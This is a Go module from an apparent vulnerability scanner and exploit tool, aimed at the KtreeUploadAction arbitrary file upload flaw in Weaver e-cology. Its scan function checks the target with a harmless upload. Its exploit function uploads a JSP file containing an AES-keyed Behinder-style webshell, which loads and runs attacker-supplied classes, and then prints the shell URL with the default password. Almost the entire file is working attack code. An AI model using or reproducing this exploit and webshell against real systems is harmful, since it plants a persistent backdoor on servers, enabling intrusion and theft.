package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"regexp"
	"strings"
)

type Wc05 struct {
}

func (s *Wc05) Scan(targetUrl string) {
	vulnerable, err := Wc05scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc05] 存在KtreeUploadAction 任意文件上传")
	} else {
		color.White("[Wc05] 不存在KtreeUploadAction 任意文件上传")
	}
}

func (*Wc05) Exploit(targetUrl string) {
	runResult, err := Wc05runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc05scancore(targetUrl string) (bool, error) {
	url := "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
	data := []byte("helloword")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "test",
		FileName:  "123.txt",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "original") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc05runcore(targetUrl string) (string, error) {
	url := "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
	data := []byte("hello<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "test",
		FileName:  "1ndex.jsp",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	r, err := regexp.Compile("url':'([\\s\\S]*?)','title")
	if err != nil {
		return "", nil
	}
	result := strings.Replace(r.FindString(resContent), "','title", "", -1)
	result = strings.Replace(result, "'", "", -1)
	result = strings.Replace(result, "url:", "", -1)
	if strings.Contains(resContent, "original") {
		return "存在KtreeUploadAction 任意文件上传\n冰蝎:" + targetUrl + result + " 默认密码", nil
	} else {
		return "", nil
	}
}
